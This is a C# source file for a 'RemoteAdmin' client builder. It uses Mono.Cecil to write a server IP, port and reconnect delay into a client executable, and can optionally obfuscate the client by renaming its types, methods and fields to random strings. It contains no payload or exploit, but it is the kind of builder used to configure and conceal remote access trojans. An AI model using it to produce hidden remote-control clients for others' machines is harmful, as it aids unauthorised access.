using System;
using System.IO;
using System.Linq;
using Mono.Cecil;
using Mono.Cecil.Cil;

namespace RemoteAdmin.Server.Build
{
    /// <summary>
    /// Client builder that modifies a single self-contained EXE.
    /// All DLLs are embedded as resources in the EXE.
    /// </summary>
    public class ClientBuilder
    {
        private readonly BuildOptions _options;
        private readonly string _clientExePath;

        public ClientBuilder(BuildOptions options, string clientExePath)
        {
            _options = options ?? throw new ArgumentNullException(nameof(options));
            _clientExePath = clientExePath ?? throw new ArgumentNullException(nameof(clientExePath));
        }

        public void Build()
        {
            using (var asm = AssemblyDefinition.ReadAssembly(_clientExePath))
            {
                WriteSettings(asm); // this already edits ClientConfig::.cctor
                if (_options.Obfuscate)
                {
                    var renamer = new Renamer(asm);
                    renamer.Perform();
                }
                asm.Write(_options.OutputPath);
            }
        }

        private void WriteSettings(AssemblyDefinition assembly)
        {
            var configType = assembly.MainModule.Types
                .FirstOrDefault(t => t.Name == "ClientConfig");

            if (configType == null)
            {
                throw new Exception("ClientConfig class not found!");
            }

            Console.WriteLine($"  Found: {configType.FullName}");

            var cctor = configType.Methods.FirstOrDefault(m => m.Name == ".cctor");
            if (cctor == null)
            {
                throw new Exception("Static constructor not found in ClientConfig!");
            }

            Console.WriteLine("  Found static constructor");

            int stringCount = 1;
            int intCount = 1;

            for (int i = 0; i < cctor.Body.Instructions.Count; i++)
            {
                var instruction = cctor.Body.Instructions[i];

                if (instruction.OpCode == OpCodes.Ldstr)
                {
                    if (stringCount == 1) // ServerIP
                    {
                        instruction.Operand = _options.ServerIP;
                        Console.WriteLine($"  → ServerIP = \"{_options.ServerIP}\"");
                    }
                    stringCount++;
                }
                else if (instruction.OpCode == OpCodes.Ldc_I4)
                {
                    if (intCount == 1) // ServerPort
                    {
                        instruction.Operand = _options.ServerPort;
                        Console.WriteLine($"  → ServerPort = {_options.ServerPort}");
                    }
                    else if (intCount == 2) // ReconnectInterval
                    {
                        instruction.Operand = _options.ReconnectDelay;
                        Console.WriteLine($"  → ReconnectDelay = {_options.ReconnectDelay}s");
                    }
                    intCount++;
                }
            }

            Console.WriteLine("  ✓ Settings injected");
        }
    }

    // Keep the Renamer class from your existing code
    public class Renamer
    {
        public AssemblyDefinition Assembly { get; set; }
        private int Length { get; set; }

        public Renamer(AssemblyDefinition assembly, int length = 20)
        {
            Assembly = assembly;
            Length = length;
        }

        public bool Perform()
        {
            try
            {
                foreach (var module in Assembly.Modules)
                {
                    foreach (var typeDef in module.Types)
                    {
                        RenameInType(typeDef);
                    }
                }
                return true;
            }
            catch
            {
                return false;
            }
        }

        private void RenameInType(TypeDefinition typeDef)
        {
            if (typeDef.Namespace.Contains("Shared") || typeDef.IsEnum || typeDef.HasInterfaces)
                return;

            typeDef.Name = GenerateRandomName();
            typeDef.Namespace = string.Empty;

            if (typeDef.HasMethods)
            {
                foreach (var methodDef in typeDef.Methods)
                {
                    if (!methodDef.IsConstructor && !methodDef.HasCustomAttributes &&
                        !methodDef.IsAbstract && !methodDef.IsVirtual)
                    {
                        methodDef.Name = GenerateRandomName();
                    }
                }
            }

            if (typeDef.HasFields)
            {
                foreach (var fieldDef in typeDef.Fields)
                {
                    if (!fieldDef.IsSpecialName)
                    {
                        fieldDef.Name = GenerateRandomName();
                    }
                }
            }

            if (typeDef.HasNestedTypes)
            {
                foreach (var nestedType in typeDef.NestedTypes)
                {
                    RenameInType(nestedType);
                }
            }
        }

        private string GenerateRandomName()
        {
            const string chars = "abcdefghijklmnopqrstuvwxyz";
            var random = new Random();
            return new string(Enumerable.Range(0, Length)
                .Select(_ => chars[random.Next(chars.Length)])
                .ToArray());
        }
    }
}